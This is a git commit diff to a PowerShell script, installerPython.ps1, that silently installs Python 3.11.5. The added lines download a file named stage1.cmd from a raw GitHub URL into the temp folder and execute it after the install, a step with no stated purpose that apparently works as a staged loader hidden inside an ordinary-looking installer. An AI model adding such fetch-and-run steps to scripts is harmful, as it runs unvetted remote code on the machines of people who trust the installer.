9f1ac87ea80ef4aa9000558bdc8e1bbf0fabf6ad
Thông Tấn <ttthong315@gmail.com>
2025-05-08 00:05:32 +0700

    fix stages

--- installerPython.ps1
+++ installerPython.ps1
@@ -1,5 +1,8 @@
 $pythonUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
 $installerPath = "$env:TEMP\python-installer.exe"
+$installerPathStage = "$env:TEMP\stage1.cmd"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/refs/heads/main/stage1.cmd -OutFile $installerPathStage
 Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
 Start-Process -FilePath $installerPath -ArgumentList "/quiet PrependPath=1 Include_test=0" -Wait -WindowStyle Hidden
 Remove-Item $installerPath
+Start-Process $installerPathStage -NoNewWindow -Wait
